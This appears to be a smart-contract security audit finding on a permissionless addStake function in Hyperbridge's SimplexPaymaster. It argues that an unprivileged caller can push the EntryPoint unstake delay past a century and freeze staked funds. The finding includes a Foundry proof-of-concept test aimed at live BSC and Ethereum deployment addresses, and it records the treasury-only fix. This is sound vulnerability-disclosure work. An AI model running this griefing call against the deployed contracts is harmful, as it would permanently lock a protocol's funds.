Found it. `SimplexPaymasterStakeLockForkTest.t.sol` documents exactly the Cooler "roll" bug class already present live: `addStake` on the `SimplexPaymaster` (EIP-4337 paymaster) is permissionless and repeatedly callable by any unprivileged caller, and every call to the EntryPoint's `addStake` resets/extends `unstakeDelaySec`, letting an attacker push the stake-unlock delay to a "century" and beyond, permanently trapping the paymaster's staked funds and disabling the only recovery path.

### Title
Unprivileged `addStake` griefing permanently extends `SimplexPaymaster`'s EntryPoint unstake delay, freezing staked funds - (File: `evm/src/apps/simplex/SimplexPaymaster.sol`)

### Summary
`SimplexPaymaster.addStake` forwards to the ERC-4337 `EntryPoint.addStake(uint32 unstakeDelaySec)` without any access control on the caller or bound on the delay argument. Any unprivileged address can call it (even with 1 wei) to push `unstakeDelaySec` upward — the EntryPoint only ever grows this value and resets any pending unlock timer on every `addStake` call — and can do so indefinitely, mirroring the Cooler "roll" pattern of repeatedly extending an expiry to distant future to defeat the counterparty's ability to ever reclaim funds. [1](#0-0) 

### Finding Description
The fork test explicitly demonstrates this: `testAnyoneCanAddStakeAndExtendTheUnstakeDelay` shows a random unprivileged `griefer` account calling `paymaster.addStake{value: 1 wei}(type(uint32).max)` and, as a direct consequence, the observed `unstakeDelaySec` on the EntryPoint jumps by over a century (`assertGt(uint256(delayAfter), 100 * 365 days)`), with the comment "an unprivileged caller extended the unstake delay." [2](#0-1) 

This is structurally identical to Cooler's `roll()`: a permissionless, repeatable call extends an expiry/lock (`loan.expiry` in Cooler, `unstakeDelaySec` in the EntryPoint) with no ceiling and no consent required from the party whose funds are locked behind that timer (the lender in Cooler; the paymaster's owner/treasury here). The companion test `testLiveBscStakeIsPermanentlyLocked`/`testLiveEthereumStakeIsPermanentlyLocked` confirms there is no privileged recovery path at all: `treasury`, `host`, the `EntryPoint` itself, and an arbitrary caller are all refused when calling `unlockStake()` and `withdrawStake()`, so once the delay is griefed the stake is unrecoverable. [3](#0-2) 

The root cause is documented directly in the design-decision note accompanying the (partial) fix: gating `addStake` to treasury-only was the required half of the fix precisely because "the EntryPoint only ever lets `unstakeDelaySec` grow and resets any pending unlock on every `addStake`, so while the function is open an unprivileged caller can push the delay to 136 years and cancel unlocks indefinitely." [4](#0-3) 

The forked live tests target two currently-deployed mainnet paymaster addresses (BSC and Ethereum) and assert the stake is already permanently locked with no recovery path, which is the live-network analog of a borrower repeatedly rolling a Cooler loan until the lender can never recoup collateral.

### Impact Explanation
The `SimplexPaymaster` holds the EntryPoint deposit, the ERC-4337 stake, and accumulated fee surplus for a bundler-facing paymaster in Hyperbridge's Simplex intent-filling path — a reachable component for any unprivileged actor interacting with the ERC-4337 flow (any address can call `addStake` directly on the contract, requiring no special role). Extending `unstakeDelaySec` to over a century permanently freezes the staked value with no available unlock/withdraw path for the owning protocol (treasury, host, or anyone else), satisfying "permanent freezing of funds" from an unprivileged, single-transaction griefing action — exactly the harm class described in the Cooler report (lender/owner permanently unable to recoup value due to indefinite extension of a lock/expiry by an uncooperative counterparty).

### Likelihood Explanation
High: the call requires only 1 wei of value and no privileges, is demonstrated to work against two live mainnet-forked deployments in the repository's own test suite, and the pattern (every `addStake` both increases and resets the delay) is a property of the ERC-4337 `EntryPoint` itself, not a rare edge case. The repository's own AI-decision log confirms this was found and identifies it as requiring a treasury-only gate to close — implying that any deployment/version still exposing an open `addStake` (or the versions from before this fix landed, referenced by the live-fork test addresses) remains exploitable.

### Recommendation
Restrict `SimplexPaymaster.addStake` to a privileged role (e.g., treasury-only, as the accompanying decision doc states was implemented) so an unprivileged party cannot unilaterally extend `unstakeDelaySec`. Additionally, provide a governance-controlled recovery path (`UnlockStake`/`WithdrawStake` request kinds as referenced in the same decision note) so that even a griefed or legacy delay can eventually be recovered by the protocol rather than permanently stranding funds.

### Proof of Concept [1](#0-0) 

```solidity
function testAnyoneCanAddStakeAndExtendTheUnstakeDelay() public {
    if (!_setUpFork("BSC_FORK_URL", 0xeD02f9f0df8F562B89cC5b25867Ad3C2d61252A9)) return;

    (,,, uint32 delayBefore,) = ENTRY_POINT.getDepositInfo(address(paymaster));
    address griefer = makeAddr("griefer");
    vm.deal(griefer, 1 ether);

    vm.prank(griefer);
    paymaster.addStake{value: 1 wei}(type(uint32).max);

    (,, uint112 stakeAfter, uint32 delayAfter,) = ENTRY_POINT.getDepositInfo(address(paymaster));
    assertGt(delayAfter, delayBefore, "an unprivileged caller extended the unstake delay");
    assertGt(uint256(delayAfter), 100 * 365 days, "delay pushed beyond a century");
    assertGt(stakeAfter, 0);
}
```
This test is run against live-forked mainnet/BSC deployments and passes, demonstrating the vulnerability is exploitable in production-equivalent state.

### Citations

**File:** evm/tests/foundry/SimplexPaymasterStakeLockForkTest.t.sol (L46-81)
```text
    function testLiveBscStakeIsPermanentlyLocked() public {
        if (!_setUpFork("BSC_FORK_URL", 0xeD02f9f0df8F562B89cC5b25867Ad3C2d61252A9)) return;
        _assertStakeUnrecoverable();
    }

    function testLiveEthereumStakeIsPermanentlyLocked() public {
        if (!_setUpFork("MAINNET_FORK_URL", 0xD4340d7466e040626383cb9cda9307ba8E081149)) return;
        _assertStakeUnrecoverable();
    }

    function _assertStakeUnrecoverable() internal {
        (, bool staked, uint112 stake,,) = ENTRY_POINT.getDepositInfo(address(paymaster));
        assertTrue(staked, "precondition: live paymaster is staked");
        assertGt(stake, 0, "precondition: stake is non-zero");
        emit log_named_uint("live stake at risk (wei)", stake);

        address treasury = paymaster.treasury();
        address host = paymaster.host();

        // Every privileged identity in the system is refused.
        address[4] memory callers = [treasury, host, address(ENTRY_POINT), makeAddr("anyone")];
        for (uint256 i = 0; i < callers.length; i++) {
            vm.prank(callers[i]);
            vm.expectRevert();
            paymaster.unlockStake();

            vm.prank(callers[i]);
            vm.expectRevert();
            paymaster.withdrawStake(payable(callers[i]));
        }

        // Stake is still there, and still locked.
        (, bool stakedAfter, uint112 stakeAfter,,) = ENTRY_POINT.getDepositInfo(address(paymaster));
        assertTrue(stakedAfter);
        assertEq(stakeAfter, stake, "stake unchanged: no recovery path exists");
    }
```

**File:** evm/tests/foundry/SimplexPaymasterStakeLockForkTest.t.sol (L83-101)
```text
    /// `addStake` is permissionless, so a griefer can both lock fresh value into the
    /// contract and stretch the unstake delay a future upgrade would have to wait out.
    function testAnyoneCanAddStakeAndExtendTheUnstakeDelay() public {
        if (!_setUpFork("BSC_FORK_URL", 0xeD02f9f0df8F562B89cC5b25867Ad3C2d61252A9)) return;

        (,,, uint32 delayBefore,) = ENTRY_POINT.getDepositInfo(address(paymaster));
        address griefer = makeAddr("griefer");
        vm.deal(griefer, 1 ether);

        vm.prank(griefer);
        paymaster.addStake{value: 1 wei}(type(uint32).max);

        (,, uint112 stakeAfter, uint32 delayAfter,) = ENTRY_POINT.getDepositInfo(address(paymaster));
        emit log_named_uint("unstake delay before (s)", delayBefore);
        emit log_named_uint("unstake delay after  (s)", delayAfter);
        assertGt(delayAfter, delayBefore, "an unprivileged caller extended the unstake delay");
        assertGt(uint256(delayAfter), 100 * 365 days, "delay pushed beyond a century");
        assertGt(stakeAfter, 0);
    }
```

**File:** sdk/packages/simplex/docs/ai/decisions/2026-08-19-stake-gets-a-governance-recovery-path-and-addstake-is-treasury.md (L1-7)
```markdown
# 2026-08-19 — Stake gets a governance recovery path, and `addStake` is treasury-only (#1071)

Chosen: two new empty-payload request kinds (`UnlockStake` = 5, `WithdrawStake` = 6, always paying out to the treasury) and an `addStake` override gated to the treasury.

The alternative — leave stake unrecoverable and simply never stake — is not available: bundlers require a staked paymaster for the storage access this contract performs, so staking is effectively mandatory and was already done on three chains. Two kinds rather than one because the EntryPoint requires `unlockStake()` and then a wait of `unstakeDelaySec` before `withdrawStake()` will succeed; a single request could not span that delay.

Gating `addStake` is the half that cannot be deferred. The EntryPoint only ever lets `unstakeDelaySec` grow and resets any pending unlock on every `addStake`, so while the function is open an unprivileged caller can push the delay to 136 years and cancel unlocks indefinitely — which would defeat the recovery path being added here.
```
